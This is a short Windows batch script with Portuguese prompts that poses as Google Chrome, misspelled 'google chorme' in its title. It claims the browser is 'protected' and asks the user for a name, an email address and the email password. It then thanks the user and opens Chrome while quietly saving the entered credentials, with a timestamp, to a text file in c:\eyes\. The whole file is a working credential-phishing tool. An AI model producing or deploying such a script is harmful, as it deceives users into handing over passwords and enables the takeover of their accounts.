@echo off



title google chorme

cls


echo.


echo -- O navegador google chrome esta protegido



echo.



echo -- E preciso entrar com seu email e senha !


echo.


echo -- pois este computador esta protegido.


echo.



set /p nome=Nome:

set /p us=Email:

set /p pass=Email Password:





msg*obrigado voce agora ja pode usar o chrome.

start chrome
echo dia %date% Hora %time% %n% logon no email: %us% Nome: %nome% e password:%pass% >"c:\eyes\%n%txt"

ping localhost -n 2 >nul



exit
